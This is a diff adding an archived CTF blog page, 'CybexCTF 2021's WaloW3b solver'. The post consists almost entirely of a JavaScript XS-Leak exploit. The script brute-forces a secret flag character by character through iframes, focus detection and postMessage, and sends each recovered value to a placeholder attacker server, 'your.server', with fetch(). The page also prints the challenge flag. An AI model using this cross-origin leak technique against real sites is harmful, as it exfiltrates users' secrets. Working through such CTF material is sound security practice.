@@ -1,0 +1,333 @@
+<!DOCTYPE html><html lang="en"><head>
+    
+      <title>
+        CybexCTF 2021&#39;s WaloW3b solver. ::
+        jorgectf — blog
+      </title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<meta name="description" content="CybexCTF 2021&amp;rsquo;s WaloW3b solver."/>
+<meta name="keywords" content=""/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="https://jorgectf.gitlab.io/blog/post/cybexctf-2021-walow3b/"/>
+
+
+
+
+
+<link rel="stylesheet" href="https://jorgectf.gitlab.io/blog/assets/style.css"/>
+
+<link rel="stylesheet" href="https://jorgectf.gitlab.io/blog/style.css"/>
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://jorgectf.gitlab.io/blog/img/apple-touch-icon-144-precomposed.png"/>
+<link rel="shortcut icon" href="https://jorgectf.gitlab.io/blog/img/favicon.png"/>
+
+
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="CybexCTF 2021&#39;s WaloW3b solver."/>
+<meta name="twitter:description" content="CybexCTF 2021’s WaloW3b solver."/>
+
+
+
+<meta property="og:title" content="CybexCTF 2021&#39;s WaloW3b solver."/>
+<meta property="og:description" content="CybexCTF 2021’s WaloW3b solver."/>
+<meta property="og:type" content="article"/>
+<meta property="og:url" content="https://jorgectf.gitlab.io/blog/post/cybexctf-2021-walow3b/"/><meta property="article:section" content="post"/>
+<meta property="article:published_time" content="2021-02-12T00:00:00+00:00"/>
+<meta property="article:modified_time" content="2021-02-12T00:00:00+00:00"/><meta property="og:site_name" content="jorgectf"/>
+
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="https://jorgectf.gitlab.io/blog/" class="logo" style="text-decoration: none;">
+  
+  <img src="https://jorgectf.gitlab.io/blog/logo.png" alt="jorgectf"/>
+  
+</a>
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+    
+    
+    <li><a href="https://jorgectf.gitbook.io/awae-oswe-preparation-resources/">OSWE Cheatsheet</a></li>
+    
+    
+    
+    <li><a href="https://jorgectf.gitlab.io/blog/research/">Research</a></li>
+    
+    
+    <li><a href="../">About</a></li>
+    
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+    
+    <li><a href="https://jorgectf.gitbook.io/awae-oswe-preparation-resources/">OSWE Cheatsheet</a></li>
+    
+    
+    
+    <li><a href="https://jorgectf.gitlab.io/blog/research/">Research</a></li>
+    
+    
+    <li><a href="../">About</a></li>
+  </ul>
+</nav>
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"></path>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"></path>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"></path>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title">CybexCTF 2021’s WaloW3b solver.</h1>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          2021-02-12
+        </span>
+
+        
+          
+        
+      
+
+      
+
+
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/ctf/">#CTF</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/cybexctf/">#CybexCTF</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/web/">#Web</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/html/">#HTML</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/xsleak/">#XSLeak</a> 
+        
+      </span>
+    
+
+    
+
+    <div class="post-content">
+      
+      <p>Contexto: <a href="https://twitter.com/takito1812/status/1361084821557170181" target="_blank">tweet</a>, <a href="https://twitter.com/juanan/status/1360396181860478977" target="_blank">tweet</a>.</p>
+<p>Código fuente: <a href="https://github.com/jorgectf/Created-CTF-Challenges/tree/main/challenges/WaloW3b%20%40%20CybexCTF%202021" target="_blank">github</a>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">html</span>&gt;
+
+&lt;<span style="color:#f92672">head</span>&gt;
+  &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UTF-8&#34;</span>&gt;
+&lt;/<span style="color:#f92672">head</span>&gt;
+
+&lt;<span style="color:#f92672">body</span>&gt;
+  &lt;<span style="color:#f92672">script</span>&gt;
+
+    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">localURL</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://127.0.0.1:4000&#34;</span>
+    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">remoteURL</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://your.server&#34;</span>
+    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">alphabet</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\&#34;!¡¿?&amp;%&#39;(),-/:;&lt;=&gt;@[\\]_`{}~&#34;</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#34;&#34;</span>);
+    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">known</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;CYBEX{¡wAlO_`L0v3S`_¿f0cUs?&amp;Sam3SiT3!}&#34;</span>;
+    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">iterator</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+
+    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">search</span>.<span style="color:#a6e22e">substr</span>(<span style="color:#ae81ff">1</span>)) {
+
+      window.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#34;message&#34;</span>, (<span style="color:#a6e22e">event</span>) =&gt; {
+        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">frame</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#39;iframe&#39;</span>);
+        <span style="color:#a6e22e">frame</span>.<span style="color:#a6e22e">src</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">localURL</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/walomsg?flag=</span><span style="color:#e6db74">${</span>encodeURIComponent(<span style="color:#a6e22e">event</span>.<span style="color:#a6e22e">data</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">&amp;msg=foo#msg`</span>;
+
+        <span style="color:#a6e22e">frame</span>.<span style="color:#a6e22e">onload</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> () {
+          <span style="color:#a6e22e">setTimeout</span>(() =&gt; {
+            <span style="color:#66d9ef">if</span> (document.<span style="color:#a6e22e">activeElement</span> <span style="color:#f92672">!=</span> document.<span style="color:#a6e22e">body</span>) {
+              <span style="color:#a6e22e">event</span>.<span style="color:#a6e22e">source</span>.<span style="color:#a6e22e">postMessage</span>(<span style="color:#a6e22e">event</span>.<span style="color:#a6e22e">data</span>, <span style="color:#e6db74">&#34;*&#34;</span>);
+            } <span style="color:#66d9ef">else</span> {
+              <span style="color:#a6e22e">event</span>.<span style="color:#a6e22e">source</span>.<span style="color:#a6e22e">postMessage</span>(<span style="color:#e6db74">&#34;justCloseMe&#34;</span>, <span style="color:#e6db74">&#34;*&#34;</span>);
+            }
+          }, <span style="color:#ae81ff">500</span>);
+        }
+
+        document.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">appendChild</span>(<span style="color:#a6e22e">frame</span>);
+      });
+
+    } <span style="color:#66d9ef">else</span> {
+
+      window.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#34;message&#34;</span>, (<span style="color:#a6e22e">event</span>) =&gt; {
+        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">event</span>.<span style="color:#a6e22e">data</span> <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;justCloseMe&#34;</span>) {
+          <span style="color:#a6e22e">known</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">event</span>.<span style="color:#a6e22e">data</span>;
+          <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">remoteURL</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/FLAG/</span><span style="color:#e6db74">${</span>encodeURIComponent(<span style="color:#a6e22e">known</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>)
+        }
+        <span style="color:#a6e22e">event</span>.<span style="color:#a6e22e">source</span>.<span style="color:#a6e22e">close</span>();
+      });
+
+      <span style="color:#a6e22e">setInterval</span>(<span style="color:#66d9ef">function</span> () {
+        <span style="color:#66d9ef">let</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">alphabet</span>[<span style="color:#a6e22e">iterator</span>];
+        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`Testing </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">known</span><span style="color:#e6db74">}</span><span style="color:#e6db74">(</span><span style="color:#e6db74">${</span><span style="color:#66d9ef">char</span><span style="color:#e6db74">}</span><span style="color:#e6db74">)`</span>);
+
+        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">win</span> <span style="color:#f92672">=</span> window.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">href</span><span style="color:#e6db74">}</span><span style="color:#e6db74">?foo`</span>, <span style="color:#e6db74">&#34;_blank&#34;</span>);
+        <span style="color:#a6e22e">win</span>.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#34;load&#34;</span>, <span style="color:#66d9ef">function</span> () {
+          <span style="color:#a6e22e">win</span>.<span style="color:#a6e22e">postMessage</span>(<span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">known</span> <span style="color:#f92672">+</span> <span style="color:#66d9ef">char</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, <span style="color:#e6db74">&#34;*&#34;</span>);
+        })
+
+        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">iterator</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">alphabet</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) {
+          <span style="color:#a6e22e">iterator</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+        } <span style="color:#66d9ef">else</span> {
+          <span style="color:#f92672">++</span><span style="color:#a6e22e">iterator</span>;
+        }
+      }, <span style="color:#ae81ff">50</span>);
+
+    }
+
+  &lt;/<span style="color:#f92672">script</span>&gt;
+&lt;/<span style="color:#f92672">body</span>&gt;
+
+&lt;/<span style="color:#f92672">html</span>&gt;
+</code></pre></div>
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr/>
+          </div>
+          <div class="pagination__buttons">
+            
+              <span class="button previous">
+                <a href="https://jorgectf.gitlab.io/blog/post/aeroctf-2021-not-received-points/">
+                  <span class="button__icon">←</span>
+                  <span class="button__text">AeroCTF 2021&#39;s Not received points solution</span>
+                </a>
+              </span>
+            
+            
+              <span class="button next">
+                <a href="https://jorgectf.gitlab.io/blog/post/defcamp-2020/">
+                  <span class="button__text">Solution for some DefCamp 2020 CTF&#39;s Web challenges</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+    
+      
+        
+
+<script src="https://unpkg.com/shiki"></script>
+
+<script>
+    if (document.querySelector("code[data-lang*='ql']")) {
+        shiki
+            .getHighlighter({
+                theme: 'github-dark',
+                langs: [
+                    {
+                        id: 'codeql',
+                        scopeName: 'source.ql',
+                        path: '/languages/codeql.tmLanguage.json',
+                        samplePath: 'codeql.sample',
+                        aliases: ['ql']
+                    }
+                ]
+            })
+            .then(highlighter => {
+                for (codeElement of document.querySelectorAll("code[data-lang]")) {
+                    try {
+                        let prev = codeElement.textContent
+                        let code = highlighter.codeToHtml(prev, { lang: codeElement.dataset.lang.toString() })
+                        codeElement.parentNode.innerHTML = code
+                    } catch(err) {
+                        console.log(err)
+                    }
+                }
+                for (shikiElement of document.querySelectorAll("pre[class='shiki']")) {
+                    shikiElement.parentNode.parentNode.replaceChild(
+                        shikiElement, shikiElement.parentNode
+                    )
+                }
+            })
+    }
+</script>
+      
+    
+  </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a href="https://jorgectf.gitlab.io/blog/" class="logo" style="text-decoration: none;">
+  
+  <img src="https://jorgectf.gitlab.io/blog/logo.png" alt="jorgectf"/>
+  
+</a>
+      <div class="copyright">
+        <span>© 2021 Powered by
+          <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span>
+        <span>Theme created by
+          <a href="https://twitter.com/panr" target="_blank" rel="noopener">panr</a></span>
+      </div>
+    
+  </div>
+</footer>
+
+<script src="https://jorgectf.gitlab.io/blog/assets/main.js"></script>
+
+
+      
+    </div>
+
+    
+  
+
+</body></html>
